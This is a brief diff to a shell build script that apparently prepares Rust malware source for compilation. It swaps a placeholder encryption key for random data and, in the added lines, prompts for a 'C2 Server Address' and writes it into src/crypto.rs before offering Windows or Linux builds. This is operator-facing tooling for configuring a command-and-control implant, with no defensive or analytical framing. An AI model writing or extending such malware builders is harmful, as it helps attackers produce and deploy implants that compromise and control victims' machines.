@@ -6,6 +6,8 @@ cp src/crypto.rs src/crypto.rs.bak
 echo "[i] Replacing key with random data."
 export KEY="$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)"
 sed -i -e "s/keyhereshouldbereplacedbybuilder/$KEY/g" src/crypto.rs
+read -p "C2 Server Address: " C2ADDR
+sed -i -e "s/c2serveraddr/$C2ADDR/g" src/crypto.rs
 echo "[!] Source ready."
 PS3='Please select option:'
 options=("Windows" "Linux" "Both" "Quit")
